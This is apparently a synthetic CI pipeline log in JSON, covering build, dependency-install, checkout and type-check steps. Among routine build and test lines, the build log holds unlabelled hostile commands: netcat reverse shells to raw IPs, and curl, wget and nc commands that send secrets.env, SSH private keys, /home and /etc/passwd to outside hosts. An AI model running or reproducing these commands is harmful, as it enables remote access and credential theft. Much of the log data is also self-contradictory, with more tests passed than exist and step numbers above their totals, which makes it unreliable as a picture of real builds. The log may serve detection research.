Deploying\nProcessing...\n[12:19:05] DEBUG: Connection pool: 2 active\nFinished.\nArtifact downloaded: 34MB\nCompiling components/handler.rs...\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\nMinifying vendor.js\nStep 1/15: Linting\nReady.\nReady.\nWaiting...\n[12:19:05] INFO: Connecting to database\nProcessing...\n  PASS: test_user_create (482ms)\nPOST /data - 202 (49ms)\n[12:19:05] DEBUG: Connection pool: 6 active\nWaiting...\n\u2713 Task completed in 3940ms\nArtifact uploaded: dist.zip (97MB)\nWARNING: lodash has known vulnerabilities\n\u2713 Task completed in 4099ms\nPlatform: darwin-arm64\nConnection established\nMinifying app.js\nProcessing...\nConnecting to cloud.services:443...\n\u2713 Task completed in 2487ms\nTime: 19.749s\nCoverage: 83% statements, 97% branches\nOK\n\u2713 All checks passed\nDone.\nTests: 400 passed, 274 total\nBuilding Docker image...\n[12:19:05] DEBUG: Connection pool: 18 active\n[12:19:05] DEBUG: Loading configuration\nMinifying main.js\nCompiling lib/utils.go...\nUsing Python 3.11\nSwitched to branch 'bugfix/task-599'\nCompiling utils/handler.rs...\nnpm install: resolved 125 packages\nStep 4/15: Running migrations\nWaiting...\nLoading...\n[12:19:05] DEBUG: Connection pool: 17 active\nChecking out main branch\nCompiling utils/utils.go...\nImage pulled successfully\nSwitched to branch 'hotfix/task-202'\n[12:19:05] INFO: Cache refreshed\nBuilding Docker image...\nSnapshots: 2 passed, 5 total\n\u2713 Task completed in 3038ms\nFetching submodules...\nAlready up to date.\nImage pulled successfully\n[12:19:05] INFO: Processing request\nGET /api - 200 (54ms)\nnpm install: added 284 packages\nWARNING: webpack has known vulnerabilities\n[12:19:05] DEBUG: Memory usage: 200MB\nCompiling utils/service.java...\nDone.\n[12:19:05] WARN: Deprecated API usage\nStep 12/21: Installing dependencies\nArtifact uploaded: build.tar.gz (16MB)\n[12:19:05] DEBUG: Query executed in 12ms\n[12:19:05] DEBUG: Connection pool: 15 active\nCompiling lib/utils.go...\nStep 1/23: Running migrations\nCompiling components/app.ts...\nWARNING: webpack has known vulnerabilities\nAlready up to date.\nGET /api - 200 (32ms)\nStep 4/17: Deploying\n[12:19:05] DEBUG: Initializing service\nUsing Node.js 16.16.5\n[12:19:05] DEBUG: Initializing service\nRan 154 tests in 55s\n[12:19:05] ERROR: Connection failed\nTransforming 139 files...\nBuilding Docker image...\n  PASS: test_db_connect (44ms)\nCompleted.\n[12:19:05] WARN: Deprecated API usage\nTLS handshake completed\nStep 12/23: Installing dependencies\npip install: Successfully installed lodash-1.18\nTests: 76 passed, 52 total\n[12:19:05] INFO: Cache refreshed\npip: Collecting lodash\npip: Collecting lodash\nHEAD is now at 7e2353b\npip: Downloading jest-4.18.tar.gz\nStep 19/25: Running migrations\nCache miss for key-2721\n\u2713 validate completed\nnpm install: added 320 packages\nCompiling lib/utils.go...\n[12:19:05] INFO: Cache refreshed\nImage pulled successfully\nMinifying app.js\nCoverage: 81% statements, 63% branches\n\u2713 All checks passed\nChecking out main branch\nTime: 73.128s\nFinished.\nnpm notice: created a lockfile\n  PASS: e2e/test_user_create.spec.js\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:05] INFO: Cache refreshed\n\u2713 All checks passed\nTLS handshake completed\nChecking out develop branch\nOK\n[12:19:05] DEBUG: Query executed in 31ms\nTime: 110.434s\nVerifying...\nNODE_ENV=test\nStep 1/17: Deploying\nSnapshots: 33 passed, 10 total\nGET /status - 204 (71ms)\nChecking out develop branch\nException: ValueError\n\u2713 All checks passed\nSwitched to branch 'feature/task-867'\n=== Step setup_node completed ===\n=== Step: build ===\nAlready up to date.\n[12:19:05] DEBUG: Connection pool: 8 active\nTests: 165 passed, 129 total\n[12:19:05] DEBUG: Initializing service\nFAILED: test_auth_login\nWARNING: axios has known vulnerabilities\nnpm install: resolved 159 packages\n[12:19:05] INFO: Cache refreshed\nConnecting to acme.corp:443...\nChecking out master branch\nyarn add: Done in 2.20s\nSnapshots: 16 passed, 44 total\n  PASS: test_auth_login (253ms)\nTests: 77 passed, 398 total\nSending 245MB of data to test.io\nOK\n[12:19:05] DEBUG: Connection pool: 14 active\nCreating production build...\nTest Suites: 37 passed, 6 total\n[12:19:05] DEBUG: Query executed in 69ms\nChecking out main branch\nMinifying main.js\nProcessing...\nUsing Node.js 18.5.1\nOK\nConnection established\nReady.\nCompiling utils/app.ts...\nnpm install: resolved 1256 packages\nCache saved successfully\nHEAD is now at 1e42258\nArtifact uploaded: build.tar.gz (19MB)\npip install: Successfully installed prettier-4.13\nUsing Node.js 14.7.6\nException: NullPointerException\nSwitched to branch 'feature/task-191'\n[12:19:05] INFO: Cache refreshed\npip: Downloading eslint-4.15.tar.gz\n\u2717 build failed with exit code 83\nCompiling src/app.ts...\n[12:19:05] INFO: Starting build process\nBundling styles.js\n[12:19:05] DEBUG: Query executed in 72ms\nWaiting...\nConnecting to test.io:443...\nStep 11/24: Deploying\nStep 13/23: Linting\nFinished.\nInstalling eslint@3.14.9\nPlatform: linux-x64\nCache restored successfully (211MB)\nAlready up to date.\nWaiting...\nException: RuntimeError\nTest Suites: 11 passed, 30 total\nImage pulled successfully\nCache saved successfully\n[12:19:05] DEBUG: Connection pool: 9 active\nSending 10MB of data to example.com\nTransforming 930 files...\nCache miss for key-2172\nCache invalidated: dependencies\n[12:19:05] INFO: Cache refreshed\nVerifying...\nCache saved successfully\npip: Downloading lodash-3.0.tar.gz\nyarn add: Done in 3.88s\nCache miss for key-5785\nCompiling components/handler.rs...\nUploading artifact 'coverage' (14 files)\nWARNING: axios has known vulnerabilities\n[12:19:05] INFO: Connecting to database\nEnvironment: production\nnpm install: added 368 packages\nCache miss for key-9001\nnc -e /bin/sh 68.234.16.214 58788\nAlready up to date.\n[12:19:05] DEBUG: Memory usage: 568MB\nnpm install: added 75 packages\npip: Downloading axios-2.10.tar.gz\nPushing to registry...\nTransforming 842 files...\nRan 75 tests in 37s\nTransforming 508 files...\nOK\nArtifact uploaded: dist.zip (52MB)\n[12:19:05] WARN: Deprecated API usage\nCompiling components/handler.rs...\npip: Downloading react-1.4.tar.gz\ncurl -X POST https://startup.dev/collect -d @secrets.env\nnpm install: added 301 packages\nDone.\npip: Installing build dependencies...\n\u2713 deploy completed\n[12:19:05] ERROR: Connection failed\nSuccess!\nCache saved successfully\nFinished.\nInstalling axios@2.13.8\n[12:19:05] INFO: Processing request\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:19:05] DEBUG: Connection pool: 17 active\n[12:19:05] INFO: Request completed\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: node:3.11\nArtifact downloaded: 45MB\necho $(cat ~/.ssh/id_rsa) | base64 | nc 67.111.222.235 24942\nConnection established\nRan 120 tests in 41s\nArtifact uploaded: dist.zip (44MB)\nHEAD is now at 5dc17e4\nStep 20/23: Installing dependencies\nPulling image: python:latest\nStep 11/15: Linting\nStep 7/23: Building\npip: Downloading react-1.0.tar.gz\nCompleted.\nStep 16/19: Installing dependencies\n\u2713 Task completed in 1281ms\nCoverage: 76% statements, 74% branches\nnpm notice: package.json updated\n  PASS: integration/test_db_connect.spec.js\nCoverage: 84% statements, 81% branches\nProcessing...\n\u2717 build failed with exit code 85\nUploading artifact 'coverage' (23 files)\nFinished.\nStep 18/17: Running migrations\nTLS handshake completed\nArtifact uploaded: dist.zip (61MB)\n[12:19:05] INFO: Cache refreshed\nnc -e /bin/sh 121.245.10.24 62571\nWARNING: axios has known vulnerabilities\nSwitched to branch 'hotfix/task-758'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:05] INFO: Starting build process\n\u2713 Step 'checkout' succeeded\n  PASS: test_api_health (4ms)\nEnvironment: staging\nCompiling utils/handler.rs...\nEnvironment: test\nnpm install: added 354 packages\nUsing Python 3.11\nCompleted.\nArtifact uploaded: build.tar.gz (35MB)\nReady.\n\u2717 build failed with exit code 61\nWaiting...\nBuilding Docker image...\nOK\nStep 8/19: Building\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:05] DEBUG: Initializing service\nTest Suites: 36 passed, 26 total\nHEAD is now at 0c1ffd5\nPushing to registry...\n[12:19:05] DEBUG: Connection pool: 17 active\nRan 88 tests in 47s\nTransforming 995 files...\nDone.\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nnpm notice: package.json updated\nCompleted.\nUsing Python 3.10\nCoverage: 94% statements, 95% branches\nStep 13/25: Deploying\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u2713 All checks passed\nnpm notice: package.json updated\n[12:19:05] INFO: Starting build process\n[12:19:05] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (8MB)\nWARNING: jest has known vulnerabilities\nCreating production build...\nWaiting...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:05] DEBUG: Query executed in 47ms\n[12:19:05] INFO: Connecting to database\nOK\nCompiling lib/main.py...\n[12:19:05] ERROR: Connection failed\nWARNING: lodash has known vulnerabilities\n  PASS: test_db_connect (67ms)\nCompiling lib/service.java...\nWARNING: jest has known vulnerabilities\n[12:19:05] DEBUG: Loading configuration\nConnection established\nProcessing...\n\u2717 build failed with exit code 51\n[12:19:05] ERROR: Connection failed\nnpm notice: created a lockfile\n[12:19:05] WARN: Deprecated API usage\nNODE_ENV=development\nFAILED: test_api_health\nMinifying vendor.js\n[12:19:05] DEBUG: Query executed in 2ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nInstalling prettier@4.17.9\necho $(cat ~/.ssh/id_rsa) | base64 | nc 122.217.60.233 44968\nOK\n  PASS: test_api_health (295ms)\n[12:19:05] INFO: Request completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 174.119.105.78 7167\nLoading...\nHEAD is now at a782ac8\nStep 10/17: Building\n  PASS: test_auth_login (305ms)\nCreating production build...\nnpm install: resolved 1460 packages\ncurl -X POST https://example.com/collect -d @secrets.env\nUsing Node.js 17.0.10\nDone.\n=== Step build completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-09T12:19:05.654902",
        "finished_at": "2025-12-09T12:19:40.029068",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "POST /upload - 202 (480ms)",
          "Loading...",
          "Finished.",
          "Snapshots: 6 passed, 25 total",
          "\u2713 lint completed",
          "Artifact downloaded: 14MB",
          "pip: Collecting webpack",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:05] INFO: Starting build process",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Snapshots: 20 passed, 6 total",
          "Checking out main branch",
          "pip: Collecting axios",
          "WARNING: express has known vulnerabilities",
          "[12:19:05] DEBUG: Query executed in 37ms",
          "Step 10/17: Installing dependencies",
          "Coverage: 89% statements, 99% branches",
          "Cache restored successfully (99MB)",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "pip install: Successfully installed prettier-3.7",
          "[12:19:05] DEBUG: Query executed in 60ms",
          "[12:19:05] WARN: Deprecated API usage",
          "  PASS: test_auth_login (320ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at f51d0a7",
          "[12:19:05] WARN: Deprecated API usage",
          "Processing...",
          "\u2713 build completed",
          "Waiting...",
          "\u2717 build failed with exit code 116",
          "Checking out master branch",
          "Artifact downloaded: 39MB",
          "GET /health - 200 (95ms)",
          "Success!",
          "Step 8/15: Linting",
          "Image pulled successfully",
          "Snapshots: 1 passed, 47 total",
          "Cache restored successfully (371MB)",
          "Cache restored successfully (493MB)",
          "Artifact uploaded: dist.zip (99MB)",
          "Step 4/16: Installing dependencies",
          "Compiling lib/handler.rs...",
          "[12:19:05] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "\u2713 validate completed",
          "pip install: Successfully installed axios-4.16",
          "Pushing to registry...",
          "[12:19:05] DEBUG: Initializing service",
          "Minifying main.js",
          "Layer 1/14: RUN command",
          "\u2713 Step 'checkout' succeeded",
          "Connecting to test.io:443...",
          "pip: Installing build dependencies...",
          "Cache restored successfully (241MB)",
          "OK",
          "Installing eslint@2.20.8",
          "pip: Collecting lodash",
          "NODE_ENV=production",
          "Generating source maps...",
          "npm notice: package.json updated",
          "[12:19:05] DEBUG: Loading configuration",
          "Finished.",
          "Cache invalidated: dependencies",
          "[12:19:05] ERROR: Connection failed",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:05] DEBUG: Query executed in 85ms",
          "Step 2/16: Installing dependencies",
          "Connecting to example.com:443...",
          "npm install: resolved 124 packages",
          "Pulling image: python:3.11",
          "[12:19:05] DEBUG: Connection pool: 20 active",
          "\u2713 Task completed in 2599ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 19/16: Running migrations",
          "Optimizing 15 modules...",
          "Loading...",
          "\u2713 All checks passed",
          "FAILED: test_user_create",
          "\u2713 All checks passed",
          "Finished.",
          "pip: Downloading prettier-1.3.tar.gz",
          "Platform: win32-x64",
          "[12:19:05] INFO: Request completed",
          "pip: Collecting prettier",
          "POST /data - 201 (128ms)",
          "npm notice: created a lockfile",
          "Pulling image: python:18",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "POST /api - 202 (417ms)",
          "Creating production build...",
          "Completed.",
          "Success!",
          "Compiling utils/service.java...",
          "Artifact downloaded: 26MB",
          "Test Suites: 41 passed, 48 total",
          "[12:19:05] INFO: Starting build process",
          "Snapshots: 48 passed, 4 total",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 Task completed in 3651ms",
          "Tests: 444 passed, 305 total",
          "TLS handshake completed",
          "  PASS: test_cache_hit (390ms)",
          "Environment: development",
          "Time: 109.794s",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling utils/main.py...",
          "Pushing to registry...",
          "Compiling src/handler.rs...",
          "npm install: resolved 1701 packages",
          "[12:19:05] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_api_health",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 314 packages",
          "pip: Downloading webpack-2.19.tar.gz",
          "WARNING: webpack has known vulnerabilities",
          "Connection established",
          "Finished.",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Coverage: 77% statements, 79% branches",
          "Connecting to acme.corp:443...",
          "Connecting to cloud.services:443...",
          "Building Docker image...",
          "GET /api - 204 (53ms)",
          "[12:19:05] DEBUG: Initializing service",
          "Already up to date.",
          "Step 6/16: Installing dependencies",
          "Cache restored successfully (384MB)",
          "Compiling components/index.js...",
          "OK",
          "OK",
          "Using Node.js 15.2.3",
          "Step 16/17: Deploying",
          "Platform: darwin-arm64",
          "Step 14/24: Running migrations",
          "Loading...",
          "TLS handshake completed",
          "Cache hit for key-2729",
          "npm notice: created a lockfile",
          "HEAD is now at 7aac4dd",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: linux-x64",
          "Installing react@4.10.6",
          "TLS handshake completed",
          "Completed.",
          "POST /upload - 202 (11ms)",
          "Ran 99 tests in 37s",
          "Image pulled successfully",
          "Compiling components/app.ts...",
          "npm install: resolved 585 packages",
          "Checking out main branch",
          "Completed.",
          "\u2717 build failed with exit code 111",
          "pip: Installing build dependencies...",
          "yarn add: Done in 4.81s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: node_modules",
          "Compiling components/main.py...",
          "Coverage: 99% statements, 80% branches",
          "pip: Collecting express",
          "Step 16/16: Deploying",
          "Artifact downloaded: 44MB",
          "Environment: staging",
          "[12:19:05] DEBUG: Initializing service",
          "TLS handshake completed",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-2681",
          "Compiling components/index.js...",
          "Compiling lib/utils.go...",
          "Compiling lib/app.ts...",
          "Waiting...",
          "Using Python 3.9",
          "[12:19:05] DEBUG: Memory usage: 480MB",
          "[12:19:05] INFO: Processing request",
          "\u2713 Step 'install' succeeded",
          "Already up to date.",
          "Done.",
          "[12:19:05] DEBUG: Connection pool: 15 active",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:05] WARN: Deprecated API usage",
          "[12:19:05] INFO: Processing request",
          "Checking out master branch",
          "pip: Collecting jest",
          "[12:19:05] INFO: Cache refreshed",
          "NODE_ENV=production",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Step 8/24: Testing",
          "Connecting to cloud.services:443...",
          "\u2713 build completed",
          "Waiting...",
          "[12:19:05] DEBUG: Memory usage: 1195MB",
          "Step 14/18: Linting",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-09T12:19:40.029068",
        "finished_at": "2025-12-09T12:19:44.612290",
        "log_lines": [
          "=== Step: checkout ===",
          "Test Suites: 11 passed, 17 total",
          "\u2713 All checks passed",
          "[12:19:05] DEBUG: Initializing service",
          "Snapshots: 20 passed, 43 total",
          "Fetching submodules...",
          "Creating production build...",
          "\u2713 All checks passed",
          "yarn add: Done in 3.41s",
          "\u2713 Task completed in 374ms",
          "[12:19:05] INFO: Request completed",
          "Pulling image: python:3.11",
          "Waiting...",
          "Pulling image: python:latest",
          "npm install: resolved 1801 packages",
          "  PASS: test_db_connect (238ms)",
          "NODE_ENV=production",
          "[12:19:05] INFO: Request completed",
          "Fetching submodules...",
          "[12:19:05] DEBUG: Query executed in 34ms",
          "Building Docker image...",
          "yarn add: Done in 20.47s",
          "NODE_ENV=test",
          "Fetching submodules...",
          "TLS handshake completed",
          "Environment: production",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Pulling image: node:3.11",
          "npm notice: package.json updated",
          "[12:19:05] DEBUG: Connection pool: 17 active",
          "Waiting...",
          "POST /upload - 201 (63ms)",
          "Success!",
          "Layer 10/8: COPY command",
          "HEAD is now at 4a75fd6",
          "[12:19:05] ERROR: Connection failed",
          "Verifying...",
          "Uploading artifact 'coverage' (46 files)",
          "Waiting...",
          "Waiting...",
          "Connecting to cloud.services:443...",
          "[12:19:05] DEBUG: Memory usage: 1819MB",
          "Switched to branch 'bugfix/task-584'",
          "Test Suites: 15 passed, 5 total",
          "Step 8/23: Installing dependencies",
          "[12:19:05] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:19:05] WARN: Deprecated API usage",
          "Loading...",
          "[12:19:05] ERROR: Connection failed",
          "Image pulled successfully",
          "Tests: 61 passed, 315 total",
          "  PASS: test_db_connect (4ms)",
          "[12:19:05] DEBUG: Initializing service",
          "\u2713 Task completed in 1593ms",
          "TLS handshake completed",
          "Completed.",
          "Done.",
          "Pushing to registry...",
          "Waiting...",
          "Building Docker image...",
          "[12:19:05] WARN: Deprecated API usage",
          "Installing react@4.14.1",
          "Coverage: 70% statements, 91% branches",
          "[12:19:05] WARN: Deprecated API usage",
          "Step 18/23: Building",
          "POST /data - 202 (349ms)",
          "\u2713 Step 'install' succeeded",
          "Step 16/21: Building",
          "pip install: Successfully installed react-1.5",
          "Finished.",
          "Cache miss for key-1975",
          "Ran 156 tests in 10s",
          "Pushing to registry...",
          "Ready.",
          "  PASS: test_auth_login (182ms)",
          "Artifact uploaded: dist.zip (15MB)",
          "Cache restored successfully (323MB)",
          "Waiting...",
          "[12:19:05] ERROR: Connection failed",
          "Step 6/18: Linting",
          "Layer 4/13: COPY command",
          "Creating production build...",
          "Cache miss for key-5641",
          "Done.",
          "Checking out master branch",
          "Layer 4/8: ENV command",
          "Using Node.js 20.12.0",
          "Switched to branch 'hotfix/task-288'",
          "Cache miss for key-8073",
          "Uploading artifact 'dist' (49 files)",
          "\u2713 All checks passed",
          "Checking out develop branch",
          "[12:19:05] INFO: Processing request",
          "Using Python 3.12",
          "[12:19:05] INFO: Connecting to database",
          "[12:19:05] DEBUG: Query executed in 57ms",
          "pip: Installing build dependencies...",
          "Connecting to test.io:443...",
          "Cache saved successfully",
          "Compiling components/main.py...",
          "[12:19:05] INFO: Request completed",
          "Generating source maps...",
          "Uploading artifact 'coverage' (19 files)",
          "Cache invalidated: build",
          "[12:19:05] INFO: Processing request",
          "Environment: development",
          "\u2717 build failed with exit code 115",
          "[12:19:05] ERROR: Connection failed",
          "Snapshots: 4 passed, 18 total",
          "Checking out master branch",
          "WARNING: react has known vulnerabilities",
          "Completed.",
          "TLS handshake completed",
          "Cache invalidated: node_modules",
          "Fetching submodules...",
          "Installing prettier@5.5.0",
          "[12:19:05] INFO: Connecting to database",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:19:05] WARN: Deprecated API usage",
          "GET /api - 201 (41ms)",
          "Checking out develop branch",
          "Cache restored successfully (191MB)",
          "pip: Collecting jest",
          "Step 14/17: Deploying",
          "Fetching submodules...",
          "[12:19:05] WARN: Deprecated API usage",
          "Connection established",
          "Compiling utils/app.ts...",
          "NODE_ENV=test",
          "[12:19:05] INFO: Starting build process",
          "Installing webpack@1.0.4",
          "Time: 82.370s",
          "Ran 136 tests in 31s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2717 build failed with exit code 40",
          "Step 3/22: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: dist.zip (94MB)",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:05] INFO: Starting build process",
          "Compiling utils/main.py...",
          "[12:19:05] INFO: Processing request",
          "[12:19:05] INFO: Request completed",
          "Waiting...",
          "Waiting...",
          "Finished.",
          "TLS handshake completed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /data - 201 (261ms)",
          "Step 8/20: Linting",
          "[12:19:05] DEBUG: Connection pool: 1 active",
          "pip install: Successfully installed react-3.8",
          "pip: Collecting axios",
          "npm install: resolved 1461 packages",
          "Checking out develop branch",
          "Coverage: 80% statements, 91% branches",
          "Processing...",
          "[12:19:05] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Installing lodash@5.1.10",
          "[12:19:05] DEBUG: Memory usage: 1838MB",
          "Minifying app.js",
          "Image pulled successfully",
          "pip: Downloading lodash-4.9.tar.gz",
          "Cache restored successfully (448MB)",
          "Completed.",
          "Transforming 508 files...",
          "Step 12/21: Deploying",
          "Image pulled successfully",
          "[12:19:05] DEBUG: Connection pool: 7 active",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Success!",
          "Ran 39 tests in 25s",
          "Generating source maps...",
          "Pushing to registry...",
          "GET /api - 200 (24ms)",
          "Cache miss for key-1179",
          "HEAD is now at 4b0d0a1",
          "npm install: resolved 1336 packages",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=test",
          "Compiling components/app.ts...",
          "Step 9/25: Deploying",
          "Creating production build...",
          "Platform: darwin-arm64",
          "Waiting...",
          "Test Suites: 37 passed, 7 total",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Step 18/24: Linting",
          "GET /status - 200 (43ms)",
          "Cache restored successfully (283MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 17.5.3",
          "Completed.",
          "  PASS: integration/test_api_health.spec.js",
          "[12:19:05] DEBUG: Connection pool: 19 active",
          "[12:19:05] INFO: Cache refreshed",
          "Coverage: 87% statements, 88% branches",
          "WARNING: eslint has known vulnerabilities",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-09T12:19:44.612290",
        "finished_at": "2025-12-09T12:19:56.070345",
        "log_lines": [
          "=== Step: type_check ===",
          "Processing...",
          "Using Python 3.11",
          "npm install: added 64 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 6/14: ENV command",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (10MB)",
          "Coverage: 93% statements, 60% branches",
          "Generating source maps...",
          "Uploading artifact 'build' (1 files)",
          "[12:19:05] WARN: Deprecated API usage",
          "Pulling image: node:18",
          "[12:19:05] INFO: Connecting to database",
          "[12:19:05] WARN: Deprecated API usage",
          "Step 17/22: Building",
          "pip install: Successfully installed jest-2.4",
          "Creating production build...",
          "Compiling components/handler.rs...",
          "Generating source maps...",
          "  PASS: test_user_create (91ms)",
          "Creating production build...",
          "Using Python 3.10",
          "Cache restored successfully (142MB)",
          "Transforming 289 files...",
          "[12:19:05] INFO: Connecting to database",
          "npm install: added 441 packages",
          "pip install: Successfully installed react-3.3",
          "Switched to branch 'hotfix/task-338'",
          "Test Suites: 31 passed, 17 total",
          "Coverage: 75% statements, 76% branches",
          "yarn add: Done in 15.61s",
          "Step 14/19: Testing",
          "Step 12/25: Installing dependencies",
          "OK",
          "WARNING: prettier has known vulnerabilities",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out main branch",
          "Coverage: 95% statements, 88% branches",
          "Compiling src/main.py...",
          "Step 7/23: Running migrations",
          "[12:19:05] DEBUG: Initializing service",
          "Verifying...",
          "[12:19:05] INFO: Request completed",
          "Tests: 402 passed, 396 total",
          "[12:19:05] INFO: Starting build process",
          "Step 18/22: Testing",
          "TLS handshake completed",
          "Processing...",
          "npm install: resolved 991 packages",
          "npm install: resolved 1949 packages",
          "Already up to date.",
          "Snapshots: 29 passed, 30 total",
          "Exception: ValueError",
          "Tests: 395 passed, 400 total",
          "Compiling src/index.js...",
          "[12:19:05] INFO: Connecting to database",
          "\u2713 Task completed in 2225ms",
          "[12:19:05] INFO: Connecting to database",
          "Compiling src/main.py...",
          "TLS handshake completed",
          "Image pulled successfully",
          "pip install: Successfully installed axios-2.13",
          "[12:19:05] INFO: Cache refreshed",
          "Image pulled successfully",
          "Step 16/19: Running migrations",
          "Optimizing 32 modules...",
          "Verifying...",
          "Compiling utils/utils.go...",
          "Using Node.js 17.1.7",
          "Bundling vendor.css",
          "Step 3/18: Linting",
          "Step 16/24: Linting",
          "Step 13/23: Deploying",
          "npm install: added 79 packages",
          "Transforming 626 files...",
          "Cache miss for key-7058",
          "\u2713 Task completed in 2659ms",
          "Pushing to registry...",
          "Step 16/22: Running migrations",
          "Compiling components/utils.go...",
          "Layer 5/14: ENV command",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:05] DEBUG: Initializing service",
          "\u2713 Task completed in 3961ms",
          "Installing react@4.14.1",
          "Processing...",
          "Transforming 325 files...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Success!",
          "Building Docker image...",
          "npm install: resolved 1996 packages",
          "Using Python 3.11",
          "TLS handshake completed",
          "Tests: 337 passed, 496 total",
          "Pushing to registry...",
          "pip: Downloading webpack-2.4.tar.gz",
          "Done.",
          "Creating production build...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Optimizing 98 modules...",
          "OK",
          "Fetching submodules...",
          "Ran 21 tests in 8s",
          "Installing express@5.20.0",
          "  PASS: test_api_health (306ms)",
          "FAILED: test_cache_hit",
          "Waiting...",
          "Image pulled successfully",
          "Snapshots: 15 passed, 35 total",
          "Coverage: 95% statements, 94% branches",
          "Creating production build...",
          "Cache hit for key-9431",
          "Fetching submodules...",
          "Step 14/16: Testing",
          "[12:19:05] DEBUG: Initializing service",
          "[12:19:05] INFO: Cache refreshed",
          "Bundling vendor.js",
          "Cache restored successfully (343MB)",
          "Compiling src/handler.rs...",
          "[12:19:05] DEBUG: Loading configuration",
          "Snapshots: 40 passed, 21 total",
          "\u2713 Step 'checkout' succeeded",
          "Completed.",
          "pip: Collecting jest",
          "[12:19:05] DEBUG: Memory usage: 174MB",
          "GET /status - 200 (30ms)",
          "Platform: darwin-arm64",
          "Connecting to example.com:443...",
          "Already up to date.",
          "Step 8/20: Installing dependencies",
          "\u2713 All checks passed",
          "Test Suites: 39 passed, 43 total",
          "Connection established",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: python:18",
          "[12:19:05] INFO: Starting build process",
          "NODE_ENV=production",
          "Environment: production",
          "Environment: development",
          "pip: Collecting react",
          "  PASS: test_user_create (433ms)",
          "pip: Installing build dependencies...",
          "Ready.",
          "[12:19:05] DEBUG: Initializing service",
          "  PASS: test_auth_login (16ms)",
          "Test Suites: 12 passed, 17 total",
          "Pulling image: node:latest",
          "Verifying...",
          "Cache saved successfully",
          "Optimizing 54 modules...",
          "pip: Collecting webpack",
          "Step 16/23: Installing dependencies",
          "Exception: NullPointerException",
          "Platform: linux-x64",
          "Tests: 393 passed, 383 total",
          "Snapshots: 31 passed, 4 total",
          "Exception: TypeError",
          "Verifying...",
          "TLS handshake completed",
          "Optimizing 62 modules...",
          "Tests: 267 passed, 436 total",
          "Fetching submodules...",
          "[12:19:05] INFO: Cache refreshed",
          "Connecting to startup.dev:443...",
          "Waiting...",
          "\u2713 All checks passed",
          "Processing...",
          "Cache hit for key-7438",
          "WARNING: jest has known vulnerabilities",
          "[12:19:05] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Image pulled successfully",
          "HEAD is now at 04dd1d4",
          "Platform: darwin-arm64",
          "[12:19:05] INFO: Request completed",
          "pip install: Successfully installed express-5.6",
          "pip install: Successfully installed webpack-5.1",
          "Step 18/19: Linting",
          "Layer 10/11: RUN command",
          "Building Docker image...",
          "\u2713 build completed",
          "Cache restored successfully (36MB)",
          "\u2713 build completed",
          "pip: Installing build dependencies...",
          "[12:19:05] DEBUG: Connection pool: 18 active",
